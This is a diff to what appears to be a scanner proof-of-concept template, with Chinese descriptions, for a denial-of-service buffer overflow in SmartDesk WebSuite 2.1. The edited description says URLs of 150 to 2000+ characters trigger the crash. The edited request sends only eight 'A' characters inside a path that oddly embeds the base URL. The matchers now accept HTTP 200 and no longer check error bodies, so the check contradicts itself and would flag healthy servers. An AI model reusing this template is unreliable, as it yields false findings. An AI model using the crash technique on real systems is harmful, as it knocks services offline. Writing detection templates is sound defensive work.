@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证 SmartDesk WebSuite 2.1 缓冲区溢出漏洞，发送超长 URL 触发拒绝服务"
+description = "SmartDesk WebSuite 2.1 存在缓冲区溢出漏洞，远程攻击者可通过向服务器发送超长 URL 请求，触发栈缓冲区溢出，导致服务崩溃拒绝服务。在 Windows 98 上发送 150-1000+ 字符的 URL 路径即可触发，Windows NT 上需要 250-2000+ 字符。"
 id = "POC-AVE-1999-0728"
-name = "CVE-1999-0928 PoC"
+name = "SmartDesk WebSuite 2.1 远程缓冲区溢出 PoC"
 severity = "medium"
 tags = ["ave-1999-0728"]
 vuln_id = [
@@ -15,33 +15,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{long_url}}"
+path = "/{{BaseURL}}/AAAAAAAA"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 status = [
+    200,
     500,
-    502,
     503,
-    504,
 ]
 type = "status"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "Server Error",
-    "Internal Server Error",
-    "Segmentation fault",
-    "Bus error",
-]
